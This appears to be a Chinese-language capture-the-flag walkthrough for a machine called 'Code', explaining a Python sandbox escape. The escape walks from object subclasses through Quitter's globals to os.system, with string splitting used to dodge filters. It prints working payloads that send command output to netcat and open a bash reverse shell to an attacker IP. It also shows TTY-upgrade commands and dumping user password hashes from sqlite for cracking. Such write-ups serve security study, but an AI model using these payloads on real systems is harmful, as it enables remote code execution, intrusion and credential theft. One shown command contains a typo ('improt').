## Code

#### 这是典型的 Python 沙箱逃逸（sandbox escape）或反序列化攻击中使用的技巧。

#### 目标是通过 Python 类的 introspection（反射）能力，获取到底层模块（如 os），再调用 os.system('ls') 执行系统命令。

22/tcp ｜ 5000/tcp open http Gunicorn 20.0.4


### 1.python3 代码绕过

https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d

```
[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('whoami | nc 主机IP 9001')
```
![全力通过](images/080601.png)

#### 0. 1..的存在是以名字方式，在语法上忽略便是。
#### 1.
__class__.__base__.__subclasses__()
__class__: 当前对象的类。
__base__: 这个类的父类（通常是 object）。
__subclasses__(): 获取该父类的所有子类（返回一个类对象列表）。所以这一步是 获取所有从 object 派生出来的类
#### 2.
[w for w in ... if w.__name__ == 'Quitter']
这步是 从所有类中筛选出类名为 'Quitter' 的那个类。
Quitter 是 Python 标准库 site.py 中定义的类，通常用于 Python 的退出处理（比如 quit() 时用到的东西）
#### 3.
[0].__init__.__globals__
[0]: 获取 'Quitter' 这个类。
__init__: 获取它的初始化方法。
__globals__: 获取初始化方法所在作用域的全局变量。
这一步可以访问当前作用域中导入的所有模块，包括 sys、os 等
#### 4.
['sy' + 's'].modules['o' + 's']
字符拼接 'sy' + 's' → 'sys'，绕过一些正则检测。
sys.modules['os']: 获取已经导入的 os 模块
#### 5.
.__dict__['sy' + 'stem']('ls')
__dict__ 是一个对象的 属性字典，最终得到 os.system('ls') → 执行 ls 命令
##### 神奇的一点是 重新向nc再次发生时，要nc退出重新执行一次才能再次连接。
```
[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i >& /dev/tcp/10.10.x.x/9001 0>&1"')
```

nc这边需要:
```
python3 -c 'improt pty;pty.spawn("/bin/bash")'
Ctrl + Z
stty raw -echo;fg
export TERM=xterm
```
### 2.解哈希密码
```
app-production@code:~/app/instance$ sqlite3 database.db
sqlite3 database.db
sqlite> .tables
.tables
code user
sqlite> select * from user;
select * from user;
developmer|xxx
martin|xxx
```
使用rockyou.txt是解不开的，https://crackstation.net/ 这个网站一下子就搞定了
![全力通过](images/080602.png)

### 3.备份backy.sh

